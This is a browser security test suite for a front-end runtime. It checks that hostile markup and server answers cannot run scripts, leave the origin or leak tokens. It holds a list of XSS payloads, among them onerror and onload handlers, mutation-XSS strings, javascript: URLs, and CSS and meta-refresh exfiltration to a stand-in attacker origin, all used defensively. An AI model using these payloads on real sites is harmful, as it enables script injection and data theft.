// The runtime against a hostile server and hostile markup, in Chromium and
// Firefox. The committed dist/ runs under the page's exact content security
// policy, served by tests/support/fixture.mjs; the last section uses the proof app.
// Each test states what must hold, so taking the protection away fails it.

import assert from "node:assert/strict";
import { after, before, describe, test } from "node:test";
import { chromium, firefox } from "playwright";
import { CSP, page as doc, start } from "./support/fixture.mjs";

const PROOF = process.env.UI_PROOF_URL || "http://127.0.0.1:8090";
// The short waits are for something to have happened: room for a busy machine.
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms <= 300 ? ms * 2.5 : ms));
const until = async (done, ms = 5000) => {
  for (const end = Date.now() + ms; !done() && Date.now() < end; ) await new Promise((resolve) => setTimeout(resolve, 20));
};
const GIF = "data:image/gif;base64,R0lGODlhAQABAAAAACw=";
let unique = 0;
const key = (name) => `${name}-${++unique}`;

for (const [engine, launcher] of [["chromium", chromium], ["firefox", firefox]]) {
  describe(engine, () => {
    let browser, f;

    before(async () => {
      browser = await launcher.launch();
      f = await start();
    });
    after(async () => {
      await browser.close();
      f.close();
    });

    /** A fresh context on `path`, with the runtime started. */
    async function fresh(path, options = {}) {
      const context = await browser.newContext(options);
      const page = await context.newPage();
      const errors = [];
      page.on("pageerror", (error) => errors.push(String(error)));
      await page.goto(f.origin + path, { waitUntil: "load" });
      await sleep(60);
      return { context, page, errors };
    }
    const route = (path, body, headers) => f.routes.set(path, (req, res) => f.html(res, typeof body === "function" ? body() : body, headers));
    const toasts = (page) => page.locator("[data-slot=toast]").allTextContents();
    const hits = (path) => f.log.filter((entry) => entry.path === path);
    const attr = (page, name) => page.evaluate((n) => document.documentElement.getAttribute(n), name);

    /** A page whose button submits a form that answers `envelope`. */
    async function afterOps(envelope, { status, body = "" } = {}) {
      const name = key("ops");
      route(`/${name}`, doc(`<div id="t">start</div>${body}<form id="f" data-ui-form method="post" action="/${name}-post"><button id="go">go</button></form>`));
      f.routes.set(`/${name}-post`, (req, res) => f.ops(res, typeof envelope === "function" ? envelope() : envelope, status));
      const opened = await fresh(`/${name}`);
      await opened.page.click("#go");
      await sleep(250);
      return opened;
    }

    test(`a field with any name leaves the form working (${engine})`, async () => {
      for (const name of ["method", "enctype", "elements", "hasAttribute", "getAttribute", "removeAttribute", "setAttribute", "toggleAttribute", "querySelectorAll", "closest", "action", "target", "id", "submit", "form", "nodeName", "attributes"]) {
        const path = key("clobber");
        route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="/${path}-post"><div data-slot="field"><input id="x" name="${name}" value="v"></div><button id="go">go</button></form>`));
        f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [{ op: "errors", form: "f", fields: { [name]: ["bad"] } }] }, 422));
        const { context, page, errors } = await fresh(`/${path}`);
        await page.evaluate(() => Document.prototype.getElementById.call(document, "go").click());
        await until(() => hits(`/${path}-post`).length);
        await sleep(200);
        const state = await page.evaluate(() => {
          const form = Document.prototype.querySelector.call(document, "form");
          return { pending: Element.prototype.hasAttribute.call(form, "data-pending"), shown: !!Document.prototype.querySelector.call(document, "[data-slot=field-error]") };
        });
        const posts = hits(`/${path}-post`);
        assert.equal(posts.length, 1, `${name}: one post`);
        assert.equal(posts[0].headers["x-navree-ui"], "1", `${name}: by the runtime`);
        assert.deepEqual(state, { pending: false, shown: true }, name);
        assert.deepEqual(errors, [], name);
        await context.close();
      }
    });

    test(`a field named enctype keeps a form multipart (${engine})`, async () => {
      const path = key("enctype");
      route(`/${path}`, doc(`<form id="f" data-ui-form method="post" enctype="multipart/form-data" action="/${path}-post"><input name="enctype" value="v"><button id="go">go</button></form>`));
      f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [] }));
      const { context, page } = await fresh(`/${path}`);
      await page.click("#go");
      await sleep(200);
      assert.match(hits(`/${path}-post`)[0].headers["content-type"], /^multipart\/form-data/);
      await context.close();
    });

    test(`a malformed token cookie doesn't hang a form (${engine})`, async () => {
      for (const value of ["%E0%A4%A", "%0Abad", "%"]) {
        const path = key("badtoken");
        route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="/${path}-post"><input name="a" value="1"><button id="go">go</button></form>`), { "set-cookie": `XSRF-TOKEN=${value}; Path=/` });
        f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [{ op: "toast", tone: "info", text: "done" }] }));
        const { context, page, errors } = await fresh(`/${path}`);
        await page.click("#go");
        await sleep(200);
        assert.equal(hits(`/${path}-post`).length, 1, value);
        assert.equal(hits(`/${path}-post`)[0].headers["x-xsrf-token"], undefined, value);
        assert.equal(await page.evaluate(() => document.getElementById("f").hasAttribute("data-pending")), false, value);
        assert.deepEqual(await toasts(page), ["done"], value);
        assert.deepEqual(errors, [], value);
        await context.close();
      }
    });

    test(`a good token after a malformed one is the one sent (${engine})`, async () => {
      const path = key("twotokens");
      route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="/${path}-post"><button id="go">go</button></form>`), { "set-cookie": `XSRF-TOKEN=%E0%A4%A; Path=/${path}` });
      f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [] }));
      const context = await browser.newContext();
      await context.addCookies([{ name: "XSRF-TOKEN", value: "good%3Dtoken", domain: "127.0.0.1", path: "/" }]);
      const page = await context.newPage();
      await page.goto(`${f.origin}/${path}`);
      await sleep(60);
      await page.click("#go");
      await sleep(200);
      assert.equal(hits(`/${path}-post`)[0].headers["x-xsrf-token"], "good=token");
      await context.close();
    });

    test(`a form aimed at another origin is stopped with its token (${engine})`, async () => {
      f.evil.length = 0;
      const path = key("xorigin");
      route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="${f.evilOrigin}/steal"><input name="secret" value="s"><button id="go">go</button></form>`), { "set-cookie": "XSRF-TOKEN=tok; Path=/" });
      const { context, page } = await fresh(`/${path}`);
      await page.click("#go");
      await sleep(200);
      assert.deepEqual(f.evil, []);
      assert.equal(await page.evaluate(() => document.getElementById("f").hasAttribute("data-pending")), false);
      await context.close();
    });

    /** Two links, a form; the form's answer changes what `/x-private` shows. */
    function staleScene(answer) {
      const name = key("stale");
      const state = { user: "alice", version: 1 };
      route(`/${name}`, doc(`<a id="link" data-ui-prefetch href="/${name}-private">account</a><form id="f" data-ui-form method="post" action="/${name}-write"><button id="go">go</button></form>`));
      route(`/${name}-private`, () => doc(`<h1 id="who">${state.user} v${state.version}</h1>`));
      f.routes.set(`/${name}-write`, (req, res) => {
        state.user = "bob";
        state.version = 2;
        f.ops(res, answer(name), 200, { "set-cookie": "user=bob; Path=/" });
      });
      return { name, state };
    }

    test(`a prefetch is not shown after a write (${engine})`, async () => {
      const { name } = staleScene(() => ({ ops: [{ op: "toast", tone: "success", text: "saved" }] }));
      const { context, page } = await fresh(`/${name}`);
      await page.hover("#link");
      await sleep(150);
      await page.click("#go");
      await sleep(150);
      await page.click("#link");
      await page.waitForSelector("#who");
      assert.equal(await page.textContent("#who"), "bob v2");
      await context.close();
    });

    test(`a prefetch is not shown after a navigate op, relative or absolute (${engine})`, async () => {
      for (const absolute of [false, true]) {
        const { name } = staleScene((n) => ({ ops: [{ op: "navigate", href: `${absolute ? f.origin : ""}/${n}-private` }] }));
        const { context, page } = await fresh(`/${name}`);
        await page.hover("#link");
        await sleep(150);
        await page.click("#go");
        await page.waitForSelector("#who");
        assert.equal(await page.textContent("#who"), "bob v2", `absolute=${absolute}`);
        await context.close();
      }
    });

    test(`a prefetch started during a write is not shown after it (${engine})`, async () => {
      const name = key("during");
      const state = { user: "alice" };
      route(`/${name}`, doc(`<a id="link" data-ui-prefetch href="/${name}-private">account</a><form id="f" data-ui-form method="post" action="/${name}-write"><button id="go">go</button></form>`));
      route(`/${name}-private`, () => doc(`<h1 id="who">${state.user}</h1>`));
      f.routes.set(`/${name}-write`, (req, res) => setTimeout(() => {
        state.user = "bob";
        f.ops(res, { ops: [] });
      }, 300));
      const { context, page } = await fresh(`/${name}`);
      await page.click("#go");
      await page.hover("#link");
      await sleep(450);
      await page.click("#link");
      await page.waitForSelector("#who");
      assert.equal(await page.textContent("#who"), "bob");
      await context.close();
    });

    test(`a write in another tab drops this tab's prefetch (${engine})`, async () => {
      const { name } = staleScene(() => ({ ops: [] }));
      const context = await browser.newContext();
      const one = await context.newPage();
      const two = await context.newPage();
      await one.goto(`${f.origin}/${name}`);
      await two.goto(`${f.origin}/${name}`);
      await sleep(60);
      await one.hover("#link");
      await sleep(150);
      await two.click("#go");
      await sleep(150);
      await one.click("#link");
      await one.waitForSelector("#who");
      assert.equal(await one.textContent("#who"), "bob v2");
      await context.close();
    });

    test(`a plain form's post drops the prefetch of other tabs (${engine})`, async () => {
      const name = key("plainpost");
      const state = { user: "alice" };
      route(`/${name}`, doc(`<a id="link" data-ui-prefetch href="/${name}-private">account</a><form id="f" method="post" action="/${name}-write"><button id="go">go</button></form>`));
      route(`/${name}-private`, () => doc(`<h1 id="who">${state.user}</h1>`));
      f.routes.set(`/${name}-write`, (req, res) => {
        state.user = "bob";
        f.html(res, doc(`<h1>signed out</h1>`));
      });
      const context = await browser.newContext();
      const one = await context.newPage();
      const two = await context.newPage();
      await one.goto(`${f.origin}/${name}`);
      await two.goto(`${f.origin}/${name}`);
      await sleep(60);
      await one.hover("#link");
      await sleep(150);
      await two.click("#go");
      await sleep(150);
      await one.click("#link");
      await one.waitForSelector("#who");
      assert.equal(await one.textContent("#who"), "bob");
      await context.close();
    });

    test(`a cookie changed by anything drops a prefetch (${engine})`, async () => {
      const name = key("cookie");
      let served = 0;
      route(`/${name}`, doc(`<a id="link" data-ui-prefetch href="/${name}-private">account</a>`));
      route(`/${name}-private`, () => doc(`<h1 id="who">${++served}</h1>`));
      const { context, page } = await fresh(`/${name}`);
      await page.hover("#link");
      await sleep(150);
      await page.evaluate(() => { document.cookie = "XSRF-TOKEN=rotated; Path=/"; });
      await page.click("#link");
      await page.waitForSelector("#who");
      assert.equal(await page.textContent("#who"), "2", "the click's own answer");
      await context.close();
    });

    test(`Cache-Control decides how long a prefetch may stand in (${engine})`, async () => {
      for (const [control, wait, reused] of [["no-store", 0, true], ["no-store", 3400, false], ["no-store, no-cache", 0, false], ["private, max-age=0", 0, false], ["private, max-age=8", 3400, true]]) {
        const name = key("control");
        let served = 0;
        route(`/${name}`, doc(`<a id="link" data-ui-prefetch href="/${name}-next">next</a>`));
        route(`/${name}-next`, () => doc(`<h1 id="n">${++served}</h1>`), { "cache-control": control });
        const { context, page } = await fresh(`/${name}`);
        await page.hover("#link");
        await sleep(150 + wait);
        await page.click("#link");
        await page.waitForSelector("#n");
        assert.equal(await page.textContent("#n"), reused ? "1" : "2", `${control} after ${wait} ms`);
        await context.close();
      }
    });

    test(`a prefetch that redirected or failed isn't what the click shows (${engine})`, async () => {
      for (const kind of ["redirect", "error", "ops"]) {
        const name = key("badprefetch");
        let calls = 0;
        route(`/${name}`, doc(`<a id="link" data-ui-prefetch href="/${name}-next">next</a>`));
        route(`/${name}-login`, doc(`<h1 id="login">Sign in</h1>`));
        f.routes.set(`/${name}-next`, (req, res) => {
          if (++calls > 1) return f.html(res, doc(`<h1 id="n">fresh</h1>`));
          if (kind === "redirect") {
            res.writeHead(303, { location: `/${name}-login` });
            return res.end();
          }
          if (kind === "error") {
            res.writeHead(500, { "content-type": "text/html" });
            return res.end("boom");
          }
          f.ops(res, { ops: [{ op: "toast", tone: "info", text: "ran by a prefetch" }] });
        });
        const { context, page } = await fresh(`/${name}`);
        await page.hover("#link");
        await sleep(200);
        await page.click("#link");
        await page.waitForSelector("#n");
        assert.equal(await page.textContent("#n"), "fresh", kind);
        assert.deepEqual(await toasts(page), [], kind);
        await context.close();
      }
    });

    test(`hover and focus fetch nothing unless a link is marked (${engine})`, async () => {
      const name = key("prefetch");
      let ran = 0;
      route(`/${name}`, doc(`<a id="out" href="/${name}-out">Sign out</a><a id="del" href="/${name}-del">Delete</a><a id="off" data-ui-prefetch data-ui-noboost href="/${name}-off">off</a>`));
      f.routes.set(`/${name}-out`, (req, res) => { ran++; f.html(res, doc("bye")); });
      f.routes.set(`/${name}-del`, (req, res) => { ran++; f.html(res, doc("gone")); });
      f.routes.set(`/${name}-off`, (req, res) => { ran++; f.html(res, doc("off")); });
      const { context, page } = await fresh(`/${name}`);
      await page.hover("#out");
      await sleep(200);
      await page.focus("#del");
      await sleep(200);
      await page.hover("#off");
      await sleep(200);
      assert.equal(ran, 0);
      await context.close();
    });

    test(`a marked link's prefetch says so, and the click reuses it (${engine})`, async () => {
      const name = key("marked");
      route(`/${name}`, doc(`<a id="link" data-ui-prefetch href="/${name}-next#top">next</a>`));
      route(`/${name}-next`, doc(`<h1 id="n">next</h1>`));
      const { context, page } = await fresh(`/${name}`);
      await page.hover("#link");
      await sleep(200);
      const sent = hits(`/${name}-next`);
      assert.equal(sent.length, 1);
      assert.equal(sent[0].headers["x-navree-prefetch"], "1");
      assert.equal(sent[0].headers["x-navree-ui"], "1");
      await page.click("#link");
      await page.waitForSelector("#n");
      assert.equal(hits(`/${name}-next`).length, 1, "the click used the prefetch");
      await context.close();
    });

    test(`a click with no hover carries no prefetch mark (${engine})`, async () => {
      const name = key("noprefetch");
      route(`/${name}`, doc(`<a id="link" href="/${name}-next">next</a>`));
      route(`/${name}-next`, doc(`<h1 id="n">next</h1>`));
      const { context, page } = await fresh(`/${name}`);
      await page.click("#link");
      await page.waitForSelector("#n");
      const sent = hits(`/${name}-next`);
      assert.equal(sent.length, 1);
      assert.equal(sent[0].headers["x-navree-prefetch"], undefined);
      await context.close();
    });

    test(`a navigate op doesn't leave the origin unless it says so (${engine})`, async () => {
      for (const href of [`${f.evilOrigin}/navigated`, `${f.evilOrigin.replace("http:", "")}/proto`, `/\${f.evilOrigin.slice(7)}/slash`, "javascript:document.documentElement.setAttribute('data-pwned','nav')"]) {
        f.evil.length = 0;
        const { context, page } = await afterOps({ ops: [{ op: "navigate", href }] });
        assert.ok(page.url().startsWith(f.origin), `${href}: ${page.url()}`);
        assert.equal(await attr(page, "data-pwned"), null, href);
        assert.deepEqual(f.evil, [], href);
        await context.close();
      }
    });

    test(`a navigate op that names itself external leaves, with no token (${engine})`, async () => {
      f.evil.length = 0;
      const { context, page } = await afterOps({ ops: [{ op: "navigate_external", href: `${f.evilOrigin}/away` }] });
      assert.ok(page.url().startsWith(f.evilOrigin), page.url());
      assert.equal(f.evil[0].headers["x-navree-ui"], undefined);
      assert.equal(f.evil[0].headers["x-xsrf-token"], undefined);
      await context.close();
    });

    test(`an external navigate op still can't run a script (${engine})`, async () => {
      for (const href of ["javascript:document.documentElement.setAttribute('data-pwned','nav')", "data:text/html,x"]) {
        const { context, page } = await afterOps({ ops: [{ op: "navigate_external", href }] });
        assert.ok(page.url().startsWith(f.origin), page.url());
        assert.equal(await attr(page, "data-pwned"), null, href);
        await context.close();
      }
    });

    test(`a url op can't name another origin (${engine})`, async () => {
      const { context, page } = await afterOps({ ops: [{ op: "url", href: `${f.evilOrigin}/x`, mode: "push" }] });
      assert.ok(page.url().startsWith(f.origin), page.url());
      await context.close();
    });

    test(`a redirect to another origin is a real navigation with no marks (${engine})`, async () => {
      f.evil.length = 0;
      const name = key("redir");
      route(`/${name}`, doc(`<a id="l" href="/${name}-go">go</a>`), { "set-cookie": "XSRF-TOKEN=tok; Path=/" });
      f.routes.set(`/${name}-go`, (req, res) => {
        res.writeHead(302, { location: `${f.evilOrigin}/redirected` });
        res.end();
      });
      const { context, page } = await fresh(`/${name}`);
      await page.click("#l");
      await page.waitForURL(`${f.evilOrigin}/**`);
      const arrived = f.evil.filter((hit) => hit.url === "/redirected").at(-1);
      assert.equal(arrived.headers["x-navree-ui"], undefined);
      assert.equal(arrived.headers["x-xsrf-token"], undefined);
      await context.close();
    });

    const recordForm = (name, n) => `<h1 id="h">Editing record ${n}</h1><form id="f" method="post" action="/save/${n}"><input id="title" name="title" value="record ${n} title"><input id="pw" type="password" name="pw"><input id="c" type="checkbox" name="c"><select id="s" name="s"><option value="a">a</option><option value="b">b</option></select><textarea id="area" name="area">notes ${n}</textarea></form><input id="loose" name="loose" value="loose ${n}"><a id="next" href="/${name}-${n + 1}">next</a>`;
    const readForm = (page) => page.evaluate(() => {
      const $ = (id) => document.getElementById(id);
      return { title: $("title").value, pw: $("pw").value, checked: $("c").checked, select: $("s").value, area: $("area").value, loose: $("loose").value };
    });

    test(`typed values don't follow a navigation to another record (${engine})`, async () => {
      const name = key("typed");
      for (const n of [1, 2]) route(`/${name}-${n}`, doc(recordForm(name, n)));
      const { context, page } = await fresh(`/${name}-1`);
      await page.fill("#title", "typed on record 1");
      await page.fill("#pw", "hunter2");
      await page.check("#c");
      await page.selectOption("#s", "b");
      await page.fill("#area", "typed notes");
      await page.fill("#loose", "typed loose");
      await page.click("#next");
      await page.waitForFunction(() => document.getElementById("h").textContent.includes("record 2"));
      assert.deepEqual(await readForm(page), { title: "record 2 title", pw: "", checked: false, select: "a", area: "notes 2", loose: "loose 2" });
      await context.close();
    });

    test(`a navigation while a field has focus resets it too (${engine})`, async () => {
      const name = key("focused");
      for (const n of [1, 2]) route(`/${name}-${n}`, doc(recordForm(name, n)));
      const { context, page } = await fresh(`/${name}-1`);
      await page.fill("#area", "typed notes");
      await page.focus("#area");
      await page.evaluate(() => document.getElementById("next").click());
      await page.waitForFunction(() => document.getElementById("h").textContent.includes("record 2"));
      assert.equal((await readForm(page)).area, "notes 2");
      await context.close();
    });

    test(`a field reset by a navigation takes later values from the server (${engine})`, async () => {
      const name = key("clean");
      for (const n of [1, 2]) route(`/${name}-${n}`, doc(`<div id="r" data-ui-src="/${name}-frag-${n}">${recordForm(name, n)}</div>`));
      route(`/${name}-frag-2`, doc(`<div id="r">${recordForm(name, 2).replace("record 2 title", "polled title").replace('value="loose 2"', 'value="polled loose"')}</div>`));
      f.routes.set(`/${name}-inv`, (req, res) => f.ops(res, { ops: [{ op: "invalidate", target: "r" }] }));
      const { context, page } = await fresh(`/${name}-1`);
      await page.fill("#title", "typed");
      await page.fill("#loose", "typed loose");
      await page.click("#next");
      await page.waitForFunction(() => document.getElementById("h").textContent.includes("record 2"));
      await page.evaluate(([path]) => {
        const form = document.createElement("form");
        form.id = "inv";
        form.setAttribute("data-ui-form", "");
        form.method = "post";
        form.action = path;
        document.body.append(form);
        form.requestSubmit();
      }, [`/${name}-inv`]);
      await sleep(250);
      const state = await readForm(page);
      assert.equal(state.title, "polled title", "the dirty mark went with the reset");
      assert.equal(state.loose, "polled loose", "also for a field in no form");
      await context.close();
    });

    test(`a save that returns to the same form starts clean (${engine})`, async () => {
      const name = key("another");
      route(`/${name}`, doc(`<h1 id="h">New</h1><form id="f" data-ui-form method="post" action="/${name}-post"><input id="title" name="title"><button id="go">save</button></form>`));
      f.routes.set(`/${name}-post`, (req, res) => f.ops(res, { ops: [{ op: "navigate", href: `/${name}` }] }));
      const { context, page } = await fresh(`/${name}`);
      await page.fill("#title", "first deal");
      await page.click("#go");
      await sleep(300);
      assert.equal(await page.inputValue("#title"), "");
      await context.close();
    });

    test(`typed values stay through a region update and a same-page answer (${engine})`, async () => {
      const name = key("keep");
      route(`/${name}`, doc(`<div id="r" data-ui-src="/${name}-frag"><input id="title" name="title" value="server"></div><form id="f" data-ui-form method="post" action="/${name}-post"><input id="other" name="other"><button id="go">go</button></form>`));
      route(`/${name}-frag`, doc(`<div id="r" data-ui-src="/${name}-frag"><input id="title" name="title" value="server 2"></div>`));
      f.routes.set(`/${name}-post`, (req, res) => f.ops(res, { ops: [{ op: "invalidate", target: "r" }] }));
      const { context, page } = await fresh(`/${name}`);
      await page.fill("#title", "typed");
      await page.fill("#other", "other typed");
      await page.click("#go");
      await sleep(250);
      assert.equal(await page.inputValue("#title"), "typed");
      assert.equal(await page.getAttribute("#title", "value"), "server 2");
      assert.equal(await page.inputValue("#other"), "other typed");
      await context.close();
    });

    const E = () => f.evilOrigin;
    const payloads = () => ({
      "inline script": `<script>document.documentElement.setAttribute("data-pwned","inline")</script>`,
      "same-origin script": `<script src="/attacker.js"></script>`,
      "off-origin script": `<script src="${E()}/x.js"></script>`,
      "img onerror": `<img src="/none.png" onerror="document.documentElement.setAttribute('data-pwned','onerror')">`,
      "svg onload": `<svg onload="document.documentElement.setAttribute('data-pwned','svg')"></svg>`,
      "meta refresh": `<meta http-equiv="refresh" content="0;url=${E()}/meta">`,
      "meta refresh nested": `<section><div><meta http-equiv="refresh" content="0;url=${E()}/meta2"></div></section>`,
      "base": `<base href="${E()}/"><a id="rel" href="relative">x</a>`,
      "iframe srcdoc": `<iframe srcdoc="<script>parent.document.documentElement.setAttribute('data-pwned','srcdoc')</script>"></iframe>`,
      "iframe": `<iframe src="${E()}/frame"></iframe>`,
      "object and embed": `<object data="${E()}/object"></object><embed src="${E()}/embed">`,
      "style exfil": `<style>@import url(${E()}/css);body{background:url(${E()}/bg)}</style><link rel="stylesheet" href="${E()}/link.css">`,
      "img": `<img src="${E()}/img">`,
      "style attribute": `<span id="styled" style="color:rgb(1,2,3);background:url(${E()}/styleattr)">x</span>`,
      "link prefetch": `<link rel="prefetch" href="${E()}/prefetch"><link rel="preload" as="fetch" href="${E()}/preload">`,
      "mxss math": `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=document.documentElement.setAttribute('data-pwned','mxss')&gt;"></table></mtext></math>`,
      "mxss svg": `<svg></p><style><a id="</style><img src=1 onerror=document.documentElement.setAttribute('data-pwned','mxss2')>"></svg>`,
      "template": `<template><script>document.documentElement.setAttribute("data-pwned","template")</script><img src="${E()}/tpl"></template>`,
      "declarative shadow": `<div><template shadowrootmode="open"><img src="${E()}/dsd"></template></div>`,
      "autofocus": `<input autofocus onfocus="document.documentElement.setAttribute('data-pwned','autofocus')">`,
      "video": `<video poster="${E()}/poster" src="${E()}/video"></video>`,
    });

    for (const via of ["morph", "replace", "append", "prepend", "boost", "region", "feed", "page answer"]) {
      test(`hostile markup by ${via} runs nothing and leaves nothing (${engine})`, { timeout: 120000 }, async () => {
        for (const [label, markup] of Object.entries(payloads())) {
          f.evil.length = 0;
          const name = key("html");
          const wrapped = `<div id="t">${markup}</div>`;
          const start = `<div id="t">start</div><div id="r" data-ui-src="/${name}-frag"></div><div id="fd" data-ui-src="/${name}-feed" data-ui-feed="into" data-ui-after="0"><div id="into"></div></div><form id="f" data-ui-form method="post" action="/${name}-post"><button id="go">go</button></form><a id="next" href="/${name}-page">next</a>`;
          route(`/${name}`, doc(start));
          route(`/${name}-page`, doc(wrapped));
          route(`/${name}-frag`, doc(`<div id="r">${markup}</div>`));
          route(`/${name}-feed`, markup);
          f.routes.set(`/${name}-post`, (req, res) => {
            if (via === "region") return f.ops(res, { ops: [{ op: "invalidate", target: "r" }] });
            if (via === "feed") return f.ops(res, { ops: [{ op: "invalidate", target: "fd" }] });
            if (via === "page answer") return f.html(res, doc(wrapped));
            f.ops(res, { ops: [{ op: via, target: "t", html: via === "morph" || via === "replace" ? wrapped : markup }] });
          });
          const { context, page } = await fresh(`/${name}`);
          await page.click(via === "boost" ? "#next" : "#go");
          await sleep(350);
          const url = page.url();
          assert.ok(url.startsWith(f.origin), `${label}: left the origin for ${url}`);
          const state = await page.evaluate(() => ({
            pwned: document.documentElement.getAttribute("data-pwned"),
            attacker: document.documentElement.getAttribute("data-attacker-ran"),
            base: document.baseURI,
            rel: document.getElementById("rel")?.href,
            styled: document.getElementById("styled") ? getComputedStyle(document.getElementById("styled")).color : null,
            leftovers: document.querySelectorAll("meta[http-equiv],base").length,
          }));
          assert.equal(state.pwned, null, label);
          assert.equal(state.attacker, null, label);
          assert.ok(state.base.startsWith(f.origin), `${label}: base ${state.base}`);
          if (state.rel) assert.ok(state.rel.startsWith(f.origin), `${label}: link ${state.rel}`);
          assert.notEqual(state.styled, "rgb(1, 2, 3)", label);
          assert.equal(state.leftovers, 0, label);
          assert.deepEqual(f.evil.map((hit) => hit.url), [], label);
          await context.close();
        }
      });
    }

    test(`a boost to a page that needs a module loads it (${engine})`, async () => {
      const name = key("module");
      route(`/${name}`, doc(`<a id="n" href="/${name}-next">n</a>`));
      route(`/${name}-next`, doc(`<h1 id="h">next</h1><button id="pop" popovertarget="p" data-ui-place>open</button><div id="p" popover data-ui-place>menu</div>`, { head: `<script type="module" src="/_navree/ui/overlay.js"></script>` }));
      const { context, page } = await fresh(`/${name}`);
      await page.click("#n");
      await page.waitForSelector("#h");
      await sleep(150);
      assert.equal(hits("/_navree/ui/overlay.js").length > 0, true, "the file was asked for");
      await page.click("#pop");
      await page.waitForFunction(() => document.getElementById("p").matches(":popover-open"));
      await sleep(50);
      assert.notEqual(await page.evaluate(() => document.getElementById("p").style.left), "", "the module placed it");
      await context.close();
    });

    test(`a boost only runs the toolkit's own modules (${engine})`, async () => {
      for (const script of [`<script src="/attacker.js"></script>`, `<script type="module" src="/attacker.js"></script>`]) {
        const name = key("headscript");
        route(`/${name}`, doc(`<a id="n" href="/${name}-next">n</a>`));
        route(`/${name}-next`, doc(`<h1 id="h">next</h1>`, { head: script }));
        const { context, page } = await fresh(`/${name}`);
        await page.click("#n");
        await page.waitForSelector("#h");
        await sleep(150);
        assert.equal(await attr(page, "data-attacker-ran"), null, script);
        await context.close();
      }
    });

    test(`a region only takes HTML (${engine})`, async () => {
      for (const [type, body] of [["text/plain", `<a id="inj" href="https://evil.example">click</a>`], ["application/json", `{"bio":"<a id='inj' href='https://evil.example'>click</a>"}`]]) {
        const { context, page } = await regionScene((res) => {
          res.writeHead(200, { "content-type": type });
          res.end(body);
        });
        assert.equal(await page.locator("#r a#inj").count(), 0, type);
        assert.equal(await page.textContent("#r"), "old", type);
        await context.close();
      }
    });

    async function regionScene(answer, attrs = "") {
      const name = key("region");
      route(`/${name}`, doc(`<div id="r" ${attrs} data-ui-src="/${name}-frag">old</div><form id="f" data-ui-form method="post" action="/${name}-inv"><button id="go">go</button></form>`));
      route(`/${name}-login`, doc(`<h1 id="login">Sign in</h1><form id="loginform" method="post"><input name="password" type="password"></form>`));
      f.routes.set(`/${name}-frag`, (req, res) => answer(res, name));
      f.routes.set(`/${name}-inv`, (req, res) => f.ops(res, { ops: [{ op: "invalidate", target: "r" }] }));
      const opened = await fresh(`/${name}`);
      await opened.page.click("#go");
      await sleep(300);
      return { ...opened, name };
    }

    test(`an expired session takes the user to the login page, not into a region (${engine})`, async () => {
      const { context, page, name } = await regionScene((res, n) => {
        res.writeHead(303, { location: `/${n}-login` });
        res.end();
      });
      assert.equal(new URL(page.url()).pathname, `/${name}-login`);
      assert.equal(await page.locator("#r").count(), 0);
      assert.equal(await page.locator("#login").count(), 1);
      await context.close();
    });

    test(`a whole page without the region is gone to, not poured in (${engine})`, async () => {
      const { context, page, name } = await regionScene((res, n) => f.html(res, doc(`<h1 id="login">Sign in</h1><input name="password" type="password">`)));
      assert.equal(new URL(page.url()).pathname, `/${name}-frag`);
      await context.close();
    });

    test(`a fragment with no runtime of its own fills a region (${engine})`, async () => {
      const { context, page } = await regionScene((res) => f.html(res, `<!doctype html><html lang="en"><head><title>x</title></head><body><b id="b">filled</b></body></html>`));
      assert.equal(await page.textContent("#r #b"), "filled");
      await context.close();
    });

    test(`an answer from another build reloads the page (${engine})`, async () => {
      const name = key("rbuild");
      let loads = 0;
      route(`/${name}`, () => { loads++; return doc(`<div id="r" data-ui-src="/${name}-frag">old</div><form id="f" data-ui-form method="post" action="/${name}-inv"><button id="go">go</button></form>`); });
      route(`/${name}-frag`, doc(`<div id="r">from another build</div>`, { build: "newer" }));
      f.routes.set(`/${name}-inv`, (req, res) => f.ops(res, { ops: [{ op: "invalidate", target: "r" }] }));
      const { context, page } = await fresh(`/${name}`);
      await page.click("#go");
      await sleep(350);
      assert.equal(await page.textContent("#r"), "old");
      assert.equal(loads, 2, "reloaded");
      await context.close();
    });

    test(`a feed takes only HTML that wasn't redirected (${engine})`, async () => {
      for (const kind of ["text", "redirect"]) {
        const name = key("feed");
        route(`/${name}`, doc(`<div id="fd" data-ui-src="/${name}-feed" data-ui-feed="into" data-ui-after="0"><ul id="into"></ul></div><form id="f" data-ui-form method="post" action="/${name}-inv"><button id="go">go</button></form>`));
        route(`/${name}-login`, doc(`<h1 id="login">Sign in</h1>`));
        f.routes.set(`/${name}-feed`, (req, res) => {
          if (kind === "redirect") res.writeHead(303, { location: `/${name}-login` });
          else res.writeHead(200, { "content-type": "text/plain" });
          res.end(`<li id="inj">x</li>`);
        });
        f.routes.set(`/${name}-inv`, (req, res) => f.ops(res, { ops: [{ op: "invalidate", target: "fd" }] }));
        const { context, page } = await fresh(`/${name}`);
        await page.click("#go");
        await sleep(300);
        assert.equal(await page.locator("#into #inj").count(), 0, kind);
        if (kind === "redirect") assert.equal(new URL(page.url()).pathname, `/${name}-login`);
        await context.close();
      }
    });

    test(`named elements can't switch the runtime off (${engine})`, async () => {
      for (const name of ["cookie", "getElementById", "querySelector", "querySelectorAll", "body", "head", "documentElement", "activeElement", "title", "createElement", "addEventListener"]) {
        const path = key("document");
        route(`/${path}`, doc(`<div id="t">start</div><img name="${name}" src="${GIF}"><form id="f" data-ui-form method="post" action="/${path}-post"><input name="a" value="1"><button id="go">go</button></form><a id="n" href="/${path}-next">n</a>`));
        f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [{ op: "morph", target: "t", html: `<div id="t">morphed</div>` }, { op: "toast", tone: "info", text: "done" }] }));
        route(`/${path}-next`, doc(`<h1 id="h">next</h1><img name="${name}" src="${GIF}">`, { title: "next" }));
        const { context, page, errors } = await fresh(`/${path}`);
        await page.evaluate(() => Document.prototype.getElementById.call(document, "go").click());
        await sleep(200);
        const state = await page.evaluate(() => ({
          t: Document.prototype.getElementById.call(document, "t").textContent,
